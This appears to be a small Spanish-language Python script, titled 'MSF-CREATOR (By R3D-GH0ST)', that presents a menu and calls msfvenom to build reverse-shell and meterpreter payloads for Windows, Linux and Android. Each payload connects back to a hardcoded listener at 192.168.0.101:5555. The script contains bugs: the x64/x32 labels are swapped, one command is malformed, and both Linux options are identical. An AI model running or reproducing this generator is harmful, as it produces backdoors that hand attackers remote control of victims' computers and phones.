#librerias
import os
import subprocess
import time
#colores
negro = '\033[30m'
rojo = '\033[31m'
verde = '\033[32m'
amarillo = '\033[33m'
azul = '\033[34m'
rosado = '\033[35m'
calipso= '\033[36m'
blanco = '\033[37m'
cierre = '\033[39m'
#Payload
def win():
    os.system('mkdir windows')
    os.system('clear')
    print(azul+"1 --> Windows x64")
    print(azul+"2 --> Windows x32")
    windows = input(">>>> ")
    if windows == "1":
        os.system('msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=5555 -f exe > windows/shell-x86.exe')
    elif windows == "2":
        os.system('msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.101 LPORT=5555-f exe > windows/shell-x64.exe')
            
def linux():
    os.system('mkdir linux')
    os.system('clear')
    print(amarillo+"1 --> Linux x64")
    print(amarillo+"2 --> Linux x32")
    linux = input(amarillo+">>>> ")
    if linux == "1":
        os.system('msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.0.101 LPORT=5555 -f elf -o linux/origen_shell')

    elif linux == "2":
        os.system('msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.0.101 LPORT=5555 -f elf -o linux/origen_shell')

def android():
    os.system('mkdir android')
    os.system('clear')
    print(verde+"Crando APK")
    os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=5555 R > android/ghost.apk')

#banner
banner = """
 __  __ ____  _____            ____ ____  _____   _  _____ ___  ____  
|  \/  / ___||  ___|          / ___|  _ \|___ /  / \|_   _/ _ \|  _ \ 
| |\/| \___ \| |_     _____  | |   | |_) | |_ \ / _ \ | || | | | |_) |
| |  | |___) |  _|   |_____| | |___|  _ < ___) / ___ \| || |_| |  _ < (By R3D-GH0ST)
|_|  |_|____/|_|              \____|_| \_\____/_/   \_\_| \___/|_| \_\ """

os.system('clear')
print(blanco+banner)
print("")
time.sleep(2)
print(azul+"1 --> Windows Payload")
print(amarillo+"2 --> Linux Payload")
print(verde+"3 --> Android Payload")
print(rojo+"4 --> Salir ")
opt_menu = input(rosado+"==> ")
if opt_menu == "1":
    win()
elif opt_menu == "2":
    linux()
elif opt_menu == "3":
    android()
elif opt_menu == "4":
    exit()
else:
    print("Error Opcion Invalidad")
